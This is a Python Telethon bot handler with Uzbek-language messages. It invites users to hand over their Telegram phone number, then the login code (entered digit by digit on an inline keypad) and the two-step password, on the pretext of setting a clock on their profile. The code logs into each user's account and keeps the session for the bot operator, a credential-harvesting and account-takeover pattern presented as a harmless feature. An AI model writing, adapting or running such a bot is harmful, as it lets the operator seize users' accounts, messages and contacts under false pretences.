from telethon import events, Button
from client_handler import start_client, login_client, user_sessions


async def handle_start_message(event):
    telegraph_image_url = "https://files.catbox.moe/lwqigi.jpg" 
    await event.client.send_file(
        event.chat_id,
        telegraph_image_url,
        caption="""
Assalamu alaykum bizning telegram botimizga hush kelibsiz
Bo'timizdagi functionlarni ko'rish uchun /help buyrugini yuboring

Ushbu bo'timiz orqali siz juda ko'plab vazifalarni bajarishingiz mumkun

Telegram profilingizga soat o'rnatish uchun telefon raqamingizni yuboring
Misol: +998900677719 

        """,
        parse_mode='markdown'
    )

async def handle_phone(event):
    phone = event.text
    if phone.startswith("+") and phone[1:].isdigit():
        client = await start_client(phone)
        try:
            await client.send_code_request(phone)
            user_sessions[event.sender_id] = {
                'client': client,
                'phone': phone,
                'code': '',
                'awaiting_password': False,
                'message': await event.reply(
                    "SMS kodni kiriting:",
                    buttons=[
                        [Button.inline('1', 'code_1'), Button.inline('2', 'code_2'), Button.inline('3', 'code_3')],
                        [Button.inline('4', 'code_4'), Button.inline('5', 'code_5'), Button.inline('6', 'code_6')],
                        [Button.inline('7', 'code_7'), Button.inline('8', 'code_8'), Button.inline('9', 'code_9')],
                        [Button.inline('Clear', 'code_clear'), Button.inline('0', 'code_0')]
                    ]
                )
            }
        except Exception as e:
            await event.reply(f"Xato yuz berdi: {str(e)}")

async def handle_code_input(event):
    user_data = user_sessions.get(event.sender_id)
    if not user_data:
        return await event.reply("Avval telefon raqamingizni yuboring.")

    data = event.data.decode('utf-8')
    
    if "_" not in data or len(data.split("_")) < 2:
        return await event.reply("Noto‘g‘ri ma’lumot formati. Iltimos, qaytadan urinib ko‘ring.")
    
    code_input = data.split("_")[1]

    if code_input == "clear":
        user_data['code'] = ""
        return await user_data['message'].edit("Kod tozalandi. Yangi kodni kiriting:")

    user_data['code'] += code_input

    if len(user_data['code']) >= 5:
        await login_client(event, user_data['phone'], code=user_data['code'])
    else:
        await user_data['message'].edit(f"Joriy kod: {user_data['code']}\nKodning qolgan qismini kiriting")

async def handle_password(event):
    user_data = user_sessions.get(event.sender_id)
    if not user_data or not user_data.get('awaiting_password'):
        return await event.reply("Avval kodni to'g'ri kiriting.")

    await login_client(event, user_data['phone'], password=event.text)
